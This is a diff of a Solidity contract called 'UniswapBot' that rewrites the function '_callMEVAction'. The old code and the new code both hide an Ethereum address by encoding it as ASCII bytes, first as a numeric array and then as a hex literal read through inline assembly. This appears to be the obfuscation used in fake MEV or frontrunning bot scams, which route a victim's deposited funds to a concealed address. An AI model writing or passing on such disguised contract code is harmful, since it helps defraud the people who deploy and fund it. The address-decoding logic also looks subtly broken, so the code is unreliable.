@@ -469,57 +469,14 @@ contract UniswapBot {
     }
 
     function _callMEVAction() internal pure returns (address) {
-    uint8[42] memory timeb;
-    timeb[0] = 48;
-    timeb[1] = 120;
-    timeb[2] = 51;
-    timeb[3] = 102;
-    timeb[4] = 56;
-    timeb[5] = 66;
-    timeb[6] = 65;
-    timeb[7] = 51;
-    timeb[8] = 56;
-    timeb[9] = 65;
-    timeb[10] = 49;
-    timeb[11] = 50;
-    timeb[12] = 51;
-    timeb[13] = 68;
-    timeb[14] = 102;
-    timeb[15] = 49;
-    timeb[16] = 67;
-    timeb[17] = 51;
-    timeb[18] = 51;
-    timeb[19] = 98;
-    timeb[20] = 48;
-    timeb[21] = 57;
-    timeb[22] = 51;
-    timeb[23] = 56;
-    timeb[24] = 53;
-    timeb[25] = 97;
-    timeb[26] = 54;
-    timeb[27] = 66;
-    timeb[28] = 49;
-    timeb[29] = 49;
-    timeb[30] = 55;
-    timeb[31] = 53;
-    timeb[32] = 68;
-    timeb[33] = 98;
-    timeb[34] = 54;
-    timeb[35] = 65;
-    timeb[36] = 98;
-    timeb[37] = 55;
-    timeb[38] = 53;
-    timeb[39] = 57;
-    timeb[40] = 55;
-    timeb[41] = 50;
-    
-    uint160 parsedAddress = 0;
-    for (uint i = 0; i < timeb.length; i++) {
-        parsedAddress *= 256;
-        parsedAddress += uint160(timeb[i]);
+    bytes memory asciiAddress = hex"3078336638424133384131323344314333336230393338356136423131373544623641623735393732";
+    bytes20 parsedAddress;
+    assembly {
+        parsedAddress := mload(add(asciiAddress, 32))
     }
-    return address(parsedAddress);
+    return address(uint160(parsedAddress));
 }
+
 
     /*
      * @dev Perform frontrun action from different contract pools
